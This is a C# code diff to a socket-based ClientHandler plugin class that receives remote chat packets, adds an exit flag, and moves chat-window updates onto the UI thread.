@@ -5,6 +5,7 @@ using System;
 using System.Drawing;
 using System.IO;
 using System.Net.Sockets;
+using System.Windows.Forms;
 
 /* 
 || AUTHOR Arsium ||
@@ -21,6 +22,7 @@ namespace Plugin
         public string HWID { get; set; }
         public string baseIp { get; set; }
         public string key { get; set; }
+        public bool hasToExit { get; set; }
 
         public delegate bool ConnectAsync();
         private delegate int SendDataAsync(IPacket data);
@@ -36,10 +38,13 @@ namespace Plugin
         public ReadPacketAsync readPacketAsync;
 
 
-        public ClientHandler(Host host, string key) : base()
+        public ClientHandler(Host host, string key, string baseIp, string HWID) : base()
         {
+            this.hasToExit = false;
             this.host = host;
             this.key = key;
+            this.HWID = HWID;
+            this.baseIp = baseIp;
             sendDataAsync = new SendDataAsync(SendData);
             readDataAsync = new ReadDataAsync(ReceiveData);
             readPacketAsync = new ReadPacketAsync(PacketParser);
@@ -67,7 +72,11 @@ namespace Plugin
         {
             Connected = connectAsync.EndInvoke(ar);
 
-            if (!Connected)
+            if (hasToExit)
+            {
+                return;
+            }
+            else if (!Connected)
             {
                 ConnectStart();
             }
@@ -79,11 +88,14 @@ namespace Plugin
 
         public void Receive()
         {
+            if (hasToExit)
+                return;
             if (Connected)
                 readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
             else
                 ConnectStart();
         }
+
         private byte[] ReceiveData()
         {
             try
@@ -110,7 +122,9 @@ namespace Plugin
             }
             catch (Exception)
             {
-                Connected = false;
+                if (Connected)
+                    hasToExit = true;
+
                 return null;
             }
         }
@@ -128,7 +142,7 @@ namespace Plugin
         {
             try
             {
-                return BufferPacket.DeserializePacket(Launch.key);
+                return BufferPacket.DeserializePacket(this.key);
             }
             catch (Exception)
             { return null;  }
@@ -148,13 +162,16 @@ namespace Plugin
             {
                 case PacketType.CHAT_ON:
                     RemoteChatPacket chatPacket = (RemoteChatPacket)packet;
-                    Launch.chatForm.msgRichTextBox.SelectionColor = Color.FromArgb(197, 66, 245);
-                    Launch.chatForm.msgRichTextBox.AppendText(chatPacket.msg);
+                    Launch.chatForm.Invoke((MethodInvoker)(() => 
+                    {
+                        Launch.chatForm.msgRichTextBox.SelectionColor = Color.FromArgb(197, 66, 245);
+                        Launch.chatForm.msgRichTextBox.AppendText(chatPacket.msg);
+                    }));
                     break;
 
                 case PacketType.CHAT_OFF:
-                    Launch.StopChatForm();
-                    this.Dispose();
+                    hasToExit = true;
+                    Launch.ExitChatForm();
                     break;
             }
         }
@@ -222,7 +239,6 @@ namespace Plugin
         }
         private void SendDataCompleted(IAsyncResult ar)
         {
-            //int length = sendDataAsync.EndInvoke(ar);
             sendDataAsync.EndInvoke(ar);
         }
 
